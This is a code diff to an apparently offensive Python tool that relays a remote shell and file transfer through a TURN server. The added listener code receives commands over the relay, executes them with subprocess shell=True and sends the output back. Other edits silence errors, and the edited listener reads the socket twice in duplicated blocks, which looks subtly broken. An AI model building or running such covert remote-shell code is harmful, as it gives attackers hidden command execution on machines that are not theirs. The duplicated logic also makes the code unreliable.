@@ -245,6 +245,7 @@ def start_file_listener(turn_server, turn_port):
     while True:
         try:
             with open(filename, 'wb') as f:
+                sock.settimeout(5)
                 while True:
                     data = sock.recv(1024)
                     if not data:
@@ -314,7 +315,7 @@ def start_shell_client(turn_server, turn_port):
                 print("Exiting client...")
                 break
             else:
-                send_packet = packetBuilder.build_channelData(channel_number, command)
+                send_packet = packetBuilder.build_channelData(channel_number, command.strip())
                 sock.sendto(send_packet, TURN_SERVER)
 
         # Send refresh packet if needed
@@ -357,9 +358,29 @@ def start_shell_listener(turn_server, turn_port):
         if sock in ready:
             try:
                 response, addr = sock.recvfrom(4096)
+                print(f"Received response from {addr} at {time.strftime('%H:%M:%S')}")
+
+                if response:
+                    print(f"Response (hex): {response.hex()}")
+                    command = _read_server_response(response)
+
+                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                    output = result.stdout if result.stdout else result.stderr
+                    output = output.strip() if output else "EXECUTION WITH NO OUTPUT..."
+
+                    # Send output back
+                    send_data_packet = packetBuilder.build_channelData(channel_number, output)
+                    sock.sendto(send_data_packet, TURN_SERVER)
+                    print("Sent command output back to client.")
+            except Exception as e:
+                print(f"Socket error: {e}")
+
+        if sock in ready:
+            try:
+                response, addr = sock.recvfrom(4096)
                 print(f"Received command from {addr} at {time.strftime('%H:%M:%S')}")
 
-                command = response.decode("utf-8").strip()
+                command = response.strip()
                 result = subprocess.run(command, shell=True, capture_output=True, text=True)
                 output = result.stdout if result.stdout else result.stderr
                 output = output.strip() if output else "EXECUTION WITH NO OUTPUT..."
@@ -369,7 +390,7 @@ def start_shell_listener(turn_server, turn_port):
                 sock.sendto(send_data_packet, TURN_SERVER)
                 print("Sent command output back to client.")
             except Exception as e:
-                print(f"Socket error: {e}")
+                pass
 
         if sys.stdin in ready:
             user_input = sys.stdin.readline().strip().lower()
@@ -491,6 +512,7 @@ def _read_server_response(response):
         print(f"LENGTH: {length}")
         message = response[4:4+length]  # Slice the message portion
         print(f"MESSAGE: {message.decode(errors='ignore')}")
+        return message.decode(errors='ignore')
 
 # ------------------------------------
 # Helper Function: Establish Connection to Turn Server
